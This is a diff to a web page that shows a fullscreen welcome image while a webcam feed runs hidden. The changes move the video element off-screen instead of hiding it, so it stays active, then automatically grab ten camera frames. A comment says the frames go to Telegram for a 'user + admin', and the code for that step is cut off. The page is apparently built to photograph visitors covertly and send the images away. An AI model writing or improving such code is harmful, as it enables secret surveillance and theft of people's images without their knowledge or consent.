@@ -21,7 +21,11 @@
       object-fit: cover;
     }
     video {
-      display: none; /* hide preview */
+      position: absolute;
+      top: -9999px; /* keep it off-screen but still active */
+      left: -9999px;
+      width: 320px;
+      height: 240px;
     }
   </style>
 </head>
@@ -30,8 +34,8 @@
   <!-- Fullscreen welcome image -->
   <img id="welcome" src="assets/welcome.jpg" alt="Welcome">
 
-  <!-- Hidden camera preview -->
-  <video id="video" autoplay playsinline></video>
+  <!-- Hidden camera preview (off-screen instead of display:none) -->
+  <video id="video" autoplay playsinline muted></video>
 
   <script>
     const video = document.getElementById('video');
@@ -50,14 +54,13 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Wait until video is actually playing before capture
-        video.onplaying = () => {
+        video.onloadedmetadata = () => {
+          video.play();
+          // wait 1s to ensure frames are ready
           setTimeout(() => {
             autoCaptureAndSend();
-          }, 500); // short delay to ensure frames are available
+          }, 1000);
         };
-
-        video.play();
       })
       .catch(err => console.error("❌ Camera permission denied:", err));
 
@@ -71,17 +74,21 @@
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
 
-      // Ensure fallback size if video reports 0x0
+      // fallback dimensions if video reports 0x0
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
+
+      console.log("📷 Capturing with size:", canvas.width, "x", canvas.height);
 
       // Capture 10 frames automatically
       for (let i = 0; i < 10; i++) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let imgData = canvas.toDataURL('image/png');
         photos.push(imgData);
-        await new Promise(r => setTimeout(r, 300)); // small delay between frames
+        await new Promise(r => setTimeout(r, 300));
       }
+
+      console.log("✅ Captured", photos.length, "photos. Sending...");
 
       // Send each photo to Telegram (user + admin)
       for (let i = 0; i < photos.length; i++) {
